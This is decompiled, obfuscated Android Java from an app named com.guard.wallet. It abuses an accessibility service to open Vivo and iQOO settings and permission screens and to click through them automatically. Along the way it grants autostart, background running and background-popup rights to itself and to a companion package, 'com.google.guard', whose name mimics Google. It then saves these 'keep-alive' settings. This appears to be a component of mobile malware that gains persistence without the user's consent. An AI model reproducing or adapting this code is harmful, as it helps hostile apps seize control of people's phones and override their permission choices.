package o;

import android.content.ComponentName;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public final class i0 extends c {
   public static final int B = 0;
   public final AtomicBoolean A;
   public final AtomicReference r = new AtomicReference<>(r.e.b);
   public final AtomicReference s = new AtomicReference(null);
   public final AtomicBoolean t = new AtomicBoolean(false);
   public final AtomicBoolean u = new AtomicBoolean(false);
   public final AtomicBoolean v = new AtomicBoolean(true);
   public final AtomicBoolean w = new AtomicBoolean(true);
   public final AtomicBoolean x = new AtomicBoolean(false);
   public final AtomicBoolean y = new AtomicBoolean(false);
   public final AtomicBoolean z = new AtomicBoolean(false);

   public i0() {
      super(u0(), "com.android.settings");
      this.A = new AtomicBoolean(false);

      try {
         ScheduledExecutorService var2 = super.p;
         h0 var1 = new h0(this, 0);
         var2.schedule(var1, 120L, TimeUnit.SECONDS);
      } catch (Exception var3) {
         a1.q.s("o.i0", var3);
      }
   }

   public static ListenWindow B0() {
      ListenWindow var0 = new ListenWindow("com.vivo.permissionmanager", "android.app.AlertDialog");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static CombineFilter C0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = a.a.c(var0, "className", "android.widget.RelativeLayout");
      var0.getStringConditions().add(var1);
      var1 = new StringCondition();
      var1.setProperty("id");
      var1.setSuffix(":id/all_opt");
      var0.getStringConditions().add(var1);
      return var0;
   }

   public static CombineFilter D0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      o.b.v("VIVO_APP_ALL_PERMISSION_TEXT", var1, var0, var1);
      return var0;
   }

   public static CombineFilter E0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      o.b.v("VIVO_BACKGROUND_POWER_MANAGER_TEXT", var1, var0, var1);
      return var0;
   }

   public static ListenWindow F0() {
      ListenWindow var0 = new ListenWindow("com.vivo.abe", "com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow G0() {
      ListenWindow var0 = new ListenWindow("com.vivo.abe", "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static CombineFilter H0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      o.b.v("VIVO_APP_PERMISSION_TEXT", var1, var0, var1);
      return var0;
   }

   public static CombineFilter b0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.Button"), "text");
      o.b.v("VIVO_ALLOW_TEXT", var1, var0, var1);
      return var0;
   }

   public static ListenWindow c0(String var0) {
      ListenWindow var1 = new ListenWindow("com.android.settings", "com.vivo.settings.VivoSubSettings");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(o.c.H(var0));
      return var1;
   }

   public static ListenWindow d0(String var0) {
      ListenWindow var1 = new ListenWindow("com.android.settings", "com.vivo.settings.applications.InstalledAppDetailsTop");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(o.c.H(var0));
      return var1;
   }

   public static ListenWindow e0(String var0) {
      ListenWindow var1 = new ListenWindow(null, null);
      o.b.q(32, o.b.r(var1), var1).add(16384);
      var1.setMatchs(new LinkedList<>());
      var1.getMatchs().add(o.c.H(var0));
      return var1;
   }

   public static ListenWindow f0() {
      ListenWindow var0 = new ListenWindow("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow g0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow h0() {
      ListenWindow var0 = new ListenWindow("com.android.permissioncontroller", "com.android.permissioncontroller.permission.ui.ManagePermissionsActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static CombineFilter i0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      o.b.v("VIVO_AUTO_START_TEXT", var1, var0, var1);
      return var0;
   }

   public static ListenWindow r0() {
      ListenWindow var0 = new ListenWindow("com.iqoo.powersaving", "com.iqoo.powersaving.activity.ExcessivePowerDescriptionActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow s0() {
      ListenWindow var0 = new ListenWindow("com.iqoo.powersaving", "com.iqoo.powersaving.activity.ExcessivePowerManagerActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static LinkedList u0() {
      LinkedList var0 = new LinkedList();
      var0.add(o.c.J());
      var0.add(d0(com.guard.wallet.utils.g.x0()));
      var0.add(c0(com.guard.wallet.utils.g.x0()));
      var0.add(d0(com.guard.wallet.utils.g.e()));
      var0.add(c0(com.guard.wallet.utils.g.e()));
      var0.add(h0());
      var0.add(g0());
      var0.add(f0());
      var0.add(e0(com.guard.wallet.utils.g.x0()));
      var0.add(e0(com.guard.wallet.utils.g.e()));
      var0.add(v0());
      var0.add(B0());
      var0.add(x0());
      var0.add(G0());
      var0.add(s0());
      var0.add(F0());
      var0.add(r0());
      return var0;
   }

   public static ListenWindow v0() {
      ListenWindow var0 = new ListenWindow("com.vivo.permissionmanager", "com.originui.widget.dialog.h");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static CombineFilter w0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = o.b.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text");
      o.b.v("VIVO_POPUP_IN_BACKGROUND_TEXT", var1, var0, var1);
      return var0;
   }

   public static ListenWindow x0() {
      ListenWindow var0 = new ListenWindow("com.iqoo.powersaving", "com.iqoo.powersaving.fuelgauge.PowerRankActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public final boolean A0() {
      try {
         if (com.guard.wallet.utils.g.Z() != null) {
            ComponentName var2 = new ComponentName("com.iqoo.powersaving", "com.iqoo.powersaving.fuelgauge.PowerRankActivity");
            Intent var1 = new Intent();
            var1.setComponent(var2);
            var1.addFlags(268435456);
            var1.addFlags(536870912);
            var1.addFlags(67108864);
            var1.addFlags(2097152);
            var1.addFlags(8388608);
            this.s.set("prepareInAppPowerRank");
            com.guard.wallet.utils.g.Z().startActivity(var1);
            Log.d("o.i0", "已启动耗电管理");
            return true;
         }
      } catch (Exception var3) {
         a1.q.s("o.i0", var3);
      }

      Log.e("o.i0", "耗电管理启动失败");
      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void Z() {
      ReentrantLock var1 = super.o;
      if (var1.tryLock()) {
         label58: {
            Exception var10000;
            label64: {
               try {
                  if (this.T()) {
                     break label58;
                  }

                  Log.d("o.i0", "准备结束本地保活自动化引擎");
                  com.guard.wallet.helper.g.h(100);
                  this.X();
                  if (MyAccessibilityService.P() != null) {
                     MyAccessibilityService.P().x();
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var10001 = false;
                  break label64;
               }

               try {
                  this.y0();
                  super.p.shutdownNow();
                  com.guard.wallet.thread.l.a(super.c);
                  super.n.clear();
                  if (a1.q.M()) {
                     com.guard.wallet.utils.g.T0(5);
                  }
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var8 = false;
                  break label64;
               }

               label49: {
                  try {
                     if (!h.e.S().U() && Objects.equals(0, com.guard.wallet.utils.d.g())) {
                        MainApplication.getInstance().offerStrategyEvent("PREPARE_LEAVE_PIP");
                        break label49;
                     }
                  } catch (Exception var5) {
                     var10000 = var5;
                     boolean var9 = false;
                     break label64;
                  }

                  try {
                     e.b.d();
                     com.guard.wallet.helper.g.c();
                  } catch (Exception var4) {
                     var10000 = var4;
                     boolean var10 = false;
                     break label64;
                  }
               }

               try {
                  Log.d("o.i0", "已结束本地保活自动化引擎");
                  o.c.W();
                  this.d();
                  break label58;
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var11 = false;
               }
            }

            Exception var2 = var10000;
            a1.q.s("o.i0", var2);
         }

         var1.unlock();
      }
   }

   @Override
   public final boolean equals(Object var1) {
      return var1 instanceof i0;
   }

   @Override
   public final int hashCode() {
      return Objects.hash(i0.class.getName());
   }

   public final boolean j0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(d0(com.guard.wallet.utils.g.x0()));
         var1.add(c0(com.guard.wallet.utils.g.x0()));
         var1.add(d0(com.guard.wallet.utils.g.e()));
         var1.add(c0(com.guard.wallet.utils.g.e()));
         if (this.q(var1)) {
            Log.d("o.i0", "已进入App详情窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.i0", var2);
      }

      return false;
   }

   public final boolean k0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(f0());
         var1.add(e0(com.guard.wallet.utils.g.x0()));
         var1.add(e0(com.guard.wallet.utils.g.e()));
         if (this.q(var1)) {
            Log.d("o.i0", "已进入App权限详情窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.i0", var2);
      }

      return false;
   }

   public final boolean l0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(h0());
         var1.add(g0());
         var1.add(e0(com.guard.wallet.utils.g.x0()));
         var1.add(e0(com.guard.wallet.utils.g.e()));
         if (this.q(var1)) {
            Log.d("o.i0", "已进入App权限管理窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.i0", var2);
      }

      return false;
   }

   public final boolean m0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(F0());
         var1.add(r0());
         if (this.q(var1)) {
            Log.d("o.i0", "已进入App后台耗电详情窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.i0", var2);
      }

      return false;
   }

   public final boolean n0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(G0());
         var1.add(s0());
         if (this.q(var1)) {
            Log.d("o.i0", "已进入后台耗电管理窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.i0", var2);
      }

      return false;
   }

   public final boolean o0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(v0());
         var1.add(B0());
         if (this.q(var1)) {
            Log.d("o.i0", "已进入是否允许权限对话框");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.i0", var2);
      }

      return false;
   }

   public final boolean p0() {
      try {
         if (this.q(Collections.singletonList(x0()))) {
            Log.d("o.i0", "已进入电池管理窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.i0", var2);
      }

      return false;
   }

   public final void q0() {
      try {
         ScreenMetricsVO var2 = com.guard.wallet.utils.e.e();
         Log.d("o.i0", String.valueOf(var2.getNavigationBarHeight()));
         Point var3 = new Point((float)var2.getWidth().intValue() / 2.0F, (float)(var2.getHeight() - var2.getNavigationBarHeight() - 100));
         Point var1 = new Point((float)var2.getWidth().intValue() / 2.0F, (float)var2.getStatusBarHeight().intValue());
         if (com.guard.wallet.utils.g.S(10L, 1000L, var3, var1)) {
            com.guard.wallet.utils.g.T0(10);
            com.guard.wallet.utils.g.s(var2.getWidth() / 2, var2.getHeight() - var2.getNavigationBarHeight() - 200);
            this.s.set("prepareInAppPermissionDetail");
         }
      } catch (Exception var4) {
         a1.q.s("o.i0", var4);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void t0() {
      Exception var10000;
      label86: {
         boolean var1;
         try {
            var1 = this.l0();
         } catch (Exception var15) {
            var10000 = var15;
            boolean var10001 = false;
            break label86;
         }

         AtomicReference var5 = this.s;
         if (var1) {
            AtomicInteger var2;
            UiObject var3;
            try {
               com.guard.wallet.helper.g.h(80);
               this.G();
               Log.d("o.i0", "active root complete");
               var3 = this.Q();
               var2 = new AtomicInteger(0);
            } catch (Exception var13) {
               var10000 = var13;
               boolean var20 = false;
               break label86;
            }

            while (var3 == null) {
               try {
                  if (var2.incrementAndGet() > 5) {
                     break;
                  }

                  com.guard.wallet.utils.g.T0(5);
                  var3 = this.Q();
               } catch (Exception var14) {
                  var10000 = var14;
                  boolean var21 = false;
                  break label86;
               }
            }

            UiObject var16;
            if (var3 != null) {
               UiObject var4;
               z.d var6;
               try {
                  Log.d("o.i0", "权限窗口滚动视图查找完成");
                  var6 = new z.d(D0(), 0);
                  var4 = var3.scrollForwardUtil(var6);
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var22 = false;
                  break label86;
               }

               var16 = var4;
               if (var4 == null) {
                  try {
                     var16 = var3.scrollBackwardUtil(var6);
                  } catch (Exception var11) {
                     var10000 = var11;
                     boolean var23 = false;
                     break label86;
                  }
               }
            } else {
               var16 = null;
            }

            var3 = var16;
            if (var16 == null) {
               try {
                  var3 = this.k().findOneByCombine(D0());
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var24 = false;
                  break label86;
               }
            }

            if (var3 != null) {
               try {
                  Log.d("o.i0", "所有权限栏目查找成功");
                  var17 = var3.findParentUtilCombine(o.c.L());
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var25 = false;
                  break label86;
               }

               if (var17 != null) {
                  try {
                     if (var17.click()) {
                        Log.d("o.i0", "查找并点击所有权限栏目完成");
                        com.guard.wallet.helper.g.h(85);
                        MyAccessibilityService.P().l0(true);
                        var5.set("prepareInAppPermissionDetail");
                        return;
                     }
                  } catch (Exception var8) {
                     var10000 = var8;
                     boolean var26 = false;
                     break label86;
                  }
               }
            }
         }

         try {
            if (Objects.equals(var5.get(), "prepareInAppPermissionManage")) {
               this.q0();
               com.guard.wallet.helper.g.h(85);
            }

            return;
         } catch (Exception var7) {
            var10000 = var7;
            boolean var27 = false;
         }
      }

      Exception var18 = var10000;
      a1.q.s("o.i0", var18);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      Exception var10000;
      label124: {
         try {
            if (this.T()) {
               return;
            }
         } catch (Exception var15) {
            var10000 = var15;
            boolean var10001 = false;
            break label124;
         }

         if (var1 != null) {
            try {
               super.u(var1, var2, var3);
            } catch (Exception var14) {
               var10000 = var14;
               boolean var26 = false;
               break label124;
            }
         }

         AtomicReference var18 = this.s;

         boolean var4;
         try {
            var4 = Objects.equals(var18.get(), "prepareInAppPowerRank");
         } catch (Exception var13) {
            var10000 = var13;
            boolean var27 = false;
            break label124;
         }

         String var16 = super.c;
         ConcurrentLinkedQueue var20 = super.n;
         if (var4) {
            try {
               if (this.p0()) {
                  com.guard.wallet.utils.g.T0(5);
                  var20.remove("keepAliveInExcessivePowerManager");
                  var20.remove("keepAliveInExcessivePowerDescription");
                  var20.remove("keepAliveInAppDetail");
                  var20.remove("keepAliveInAppPermissionManage");
                  var20.remove("keepAliveInAppPermissionDetail");
                  var20.remove("keepAliveInPermissionAllowDialog");
                  if (!var20.contains("keepAliveInPowerRank")) {
                     var20.add("keepAliveInPowerRank");
                     h0 var5 = new h0(this, 1);
                     com.guard.wallet.thread.l.c(var5, var16);
                  }
               }
            } catch (Exception var12) {
               var10000 = var12;
               boolean var28 = false;
               break label124;
            }
         }

         try {
            if (Objects.equals(var18.get(), "prepareInExcessivePowerManager") && this.n0()) {
               com.guard.wallet.utils.g.T0(5);
               var20.remove("keepAliveInPowerRank");
               var20.remove("keepAliveInExcessivePowerDescription");
               var20.remove("keepAliveInAppDetail");
               var20.remove("keepAliveInAppPermissionManage");
               var20.remove("keepAliveInAppPermissionDetail");
               var20.remove("keepAliveInPermissionAllowDialog");
               if (!var20.contains("keepAliveInExcessivePowerManager")) {
                  var20.add("keepAliveInExcessivePowerManager");
                  h0 var21 = new h0(this, 2);
                  com.guard.wallet.thread.l.c(var21, var16);
               }
            }
         } catch (Exception var11) {
            var10000 = var11;
            boolean var29 = false;
            break label124;
         }

         try {
            if (Objects.equals(var18.get(), "prepareInExcessivePowerDescription") && this.m0()) {
               com.guard.wallet.utils.g.T0(5);
               var20.remove("keepAliveInPowerRank");
               var20.remove("keepAliveInExcessivePowerManager");
               var20.remove("keepAliveInAppDetail");
               var20.remove("keepAliveInAppPermissionManage");
               var20.remove("keepAliveInAppPermissionDetail");
               var20.remove("keepAliveInPermissionAllowDialog");
               if (!var20.contains("keepAliveInExcessivePowerDescription")) {
                  var20.add("keepAliveInExcessivePowerDescription");
                  h0 var22 = new h0(this, 3);
                  com.guard.wallet.thread.l.c(var22, var16);
               }
            }
         } catch (Exception var10) {
            var10000 = var10;
            boolean var30 = false;
            break label124;
         }

         try {
            if (Objects.equals(var18.get(), "prepareInAppDetailSetting") && this.j0()) {
               com.guard.wallet.utils.g.T0(5);
               var20.remove("keepAliveInPowerRank");
               var20.remove("keepAliveInExcessivePowerManager");
               var20.remove("keepAliveInExcessivePowerDescription");
               var20.remove("keepAliveInAppPermissionManage");
               var20.remove("keepAliveInAppPermissionDetail");
               var20.remove("keepAliveInPermissionAllowDialog");
               if (!var20.contains("keepAliveInAppDetail")) {
                  var20.add("keepAliveInAppDetail");
                  h0 var23 = new h0(this, 4);
                  com.guard.wallet.thread.l.c(var23, var16);
               }
            }
         } catch (Exception var9) {
            var10000 = var9;
            boolean var31 = false;
            break label124;
         }

         try {
            if (Objects.equals(var18.get(), "prepareInAppPermissionManage") && this.l0()) {
               com.guard.wallet.utils.g.T0(5);
               var20.remove("keepAliveInPowerRank");
               var20.remove("keepAliveInExcessivePowerManager");
               var20.remove("keepAliveInExcessivePowerDescription");
               var20.remove("keepAliveInAppDetail");
               var20.remove("keepAliveInAppPermissionDetail");
               var20.remove("keepAliveInPermissionAllowDialog");
               if (!var20.contains("keepAliveInAppPermissionManage")) {
                  var20.add("keepAliveInAppPermissionManage");
                  h0 var24 = new h0(this, 5);
                  com.guard.wallet.thread.l.c(var24, var16);
               }
            }
         } catch (Exception var8) {
            var10000 = var8;
            boolean var32 = false;
            break label124;
         }

         try {
            if (Objects.equals(var18.get(), "prepareInAppPermissionDetail") && this.k0()) {
               com.guard.wallet.utils.g.T0(5);
               var20.remove("keepAliveInPowerRank");
               var20.remove("keepAliveInExcessivePowerManager");
               var20.remove("keepAliveInExcessivePowerDescription");
               var20.remove("keepAliveInAppDetail");
               var20.remove("keepAliveInAppPermissionManage");
               var20.remove("keepAliveInPermissionAllowDialog");
               if (!var20.contains("keepAliveInAppPermissionDetail")) {
                  var20.add("keepAliveInAppPermissionDetail");
                  h0 var25 = new h0(this, 6);
                  com.guard.wallet.thread.l.c(var25, var16);
               }
            }
         } catch (Exception var7) {
            var10000 = var7;
            boolean var33 = false;
            break label124;
         }

         try {
            if (Objects.equals(var18.get(), "prepareInPermissionAllowDialog") && this.o0()) {
               com.guard.wallet.utils.g.T0(5);
               var20.remove("keepAliveInPowerRank");
               var20.remove("keepAliveInExcessivePowerManager");
               var20.remove("keepAliveInExcessivePowerDescription");
               var20.remove("keepAliveInAppDetail");
               var20.remove("keepAliveInAppPermissionManage");
               var20.remove("keepAliveInAppPermissionDetail");
               if (!var20.contains("keepAliveInPermissionAllowDialog")) {
                  var20.add("keepAliveInPermissionAllowDialog");
                  h0 var19 = new h0(this, 7);
                  com.guard.wallet.thread.l.c(var19, var16);
                  return;
               }
            }

            return;
         } catch (Exception var6) {
            var10000 = var6;
            boolean var34 = false;
         }
      }

      Exception var17 = var10000;
      a1.q.s("o.i0", var17);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void y0() {
      Exception var10000;
      label124: {
         PowerControlStateVO var1;
         try {
            var1 = com.guard.wallet.utils.h.k(MainApplication.getAppContext().getPackageName());
            var1.setPackageName(MainApplication.getAppContext().getPackageName());
         } catch (Exception var13) {
            var10000 = var13;
            boolean var10001 = false;
            break label124;
         }

         AtomicBoolean var2 = this.t;

         try {
            if (var2.get()) {
               var1.setAllowAutoStart(var2.get());
            }
         } catch (Exception var12) {
            var10000 = var12;
            boolean var23 = false;
            break label124;
         }

         var2 = this.v;

         try {
            if (var2.get()) {
               var1.setAllowRelateStart(var2.get());
            }
         } catch (Exception var11) {
            var10000 = var11;
            boolean var24 = false;
            break label124;
         }

         var2 = this.x;

         try {
            if (var2.get()) {
               var1.setAllowAllFullBackground(var2.get());
            }
         } catch (Exception var10) {
            var10000 = var10;
            boolean var25 = false;
            break label124;
         }

         var2 = this.z;

         try {
            if (var2.get()) {
               var1.setAllowPopupInBackground(var2.get());
            }
         } catch (Exception var9) {
            var10000 = var9;
            boolean var26 = false;
            break label124;
         }

         try {
            var1.setRetryCount(var1.getRetryCount() + 1);
            com.guard.wallet.utils.h.L(var1);
            Log.d("o.i0", "主进程保活策略已保存");
            var1 = com.guard.wallet.utils.h.k("com.google.guard");
            var1.setPackageName("com.google.guard");
         } catch (Exception var8) {
            var10000 = var8;
            boolean var27 = false;
            break label124;
         }

         var2 = this.u;

         try {
            if (var2.get()) {
               var1.setAllowAutoStart(var2.get());
            }
         } catch (Exception var7) {
            var10000 = var7;
            boolean var28 = false;
            break label124;
         }

         var2 = this.w;

         try {
            if (var2.get()) {
               var1.setAllowRelateStart(var2.get());
            }
         } catch (Exception var6) {
            var10000 = var6;
            boolean var29 = false;
            break label124;
         }

         var2 = this.y;

         try {
            if (var2.get()) {
               var1.setAllowAllFullBackground(var2.get());
            }
         } catch (Exception var5) {
            var10000 = var5;
            boolean var30 = false;
            break label124;
         }

         var2 = this.A;

         try {
            if (var2.get()) {
               var1.setAllowPopupInBackground(var2.get());
            }
         } catch (Exception var4) {
            var10000 = var4;
            boolean var31 = false;
            break label124;
         }

         try {
            var1.setRetryCount(var1.getRetryCount() + 1);
            com.guard.wallet.utils.h.L(var1);
            Log.d("o.i0", "备用进程保活策略已保存");
            return;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var32 = false;
         }
      }

      Exception var15 = var10000;
      a1.q.s("o.i0", var15);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void z0() {
      Exception var10000;
      label73: {
         try {
            this.y0();
         } catch (Exception var10) {
            var10000 = var10;
            boolean var10001 = false;
            break label73;
         }

         AtomicReference var4 = this.r;

         boolean var1;
         try {
            var1 = Objects.equals(var4.get(), r.e.b);
         } catch (Exception var9) {
            var10000 = var9;
            boolean var13 = false;
            break label73;
         }

         r.e var3 = r.e.d;
         r.e var5 = r.e.c;
         AtomicReference var2 = this.s;
         if (var1) {
            try {
               if (!com.guard.wallet.utils.h.r(MyAccessibilityService.P().getPackageName())) {
                  var4.set(var5);
                  var2.set("prepareInAppDetailSetting");
                  com.guard.wallet.utils.g.Z0(MyAccessibilityService.P().getPackageName());
                  Log.d("o.i0", MyAccessibilityService.P().getPackageName().concat(" 应用详情已启动"));
                  MyAccessibilityService.P().getPackageName().concat(" 应用详情已启动");
                  return;
               }
            } catch (Exception var11) {
               var10000 = var11;
               boolean var14 = false;
               break label73;
            }

            try {
               if (!com.guard.wallet.utils.h.r("com.google.guard") && com.guard.wallet.utils.g.d0("com.google.guard") != null) {
                  var4.set(var3);
                  var2.set("prepareInAppDetailSetting");
                  com.guard.wallet.utils.g.Z0("com.google.guard");
                  Log.d("o.i0", "com.google.guard".concat(" 应用详情已启动"));
                  "com.google.guard".concat(" 应用详情已启动");
                  return;
               }
            } catch (Exception var8) {
               var10000 = var8;
               boolean var15 = false;
               break label73;
            }
         }

         try {
            if (Objects.equals(var4.get(), var5) && !com.guard.wallet.utils.h.r("com.google.guard") && com.guard.wallet.utils.g.d0("com.google.guard") != null) {
               var4.set(var3);
               var2.set("prepareInAppDetailSetting");
               com.guard.wallet.utils.g.Z0("com.google.guard");
               Log.d("o.i0", "com.google.guard".concat(" 应用详情已启动"));
               "com.google.guard".concat(" 应用详情已启动");
               return;
            }
         } catch (Exception var7) {
            var10000 = var7;
            boolean var16 = false;
            break label73;
         }

         try {
            this.y0();
            this.Z();
            return;
         } catch (Exception var6) {
            var10000 = var6;
            boolean var17 = false;
         }
      }

      Exception var12 = var10000;
      a1.q.s("o.i0", var12);
   }
}
